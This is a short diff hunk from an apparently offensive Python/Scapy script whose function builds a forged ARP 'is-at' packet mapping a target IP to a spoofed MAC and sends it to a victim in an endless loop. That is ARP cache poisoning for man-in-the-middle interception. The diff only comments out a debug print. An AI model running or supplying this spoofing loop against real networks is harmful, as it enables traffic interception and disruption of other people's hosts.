@@ -37,7 +37,7 @@ def arpp(target, victim,mode):
 		brk=False
 	vmac=getmacbyip(victim)
 	poison= Ether(dst=vmac,src=fsrc)/ARP(op="is-at",hwdst=vmac,hwsrc=fsrc,psrc=target, pdst=victim) # Scapy don't update ARP HW addrs automatically 
-	poison.show()
+	#poison.show()
 	while 1:
 		sendp(poison)
 		if brk:
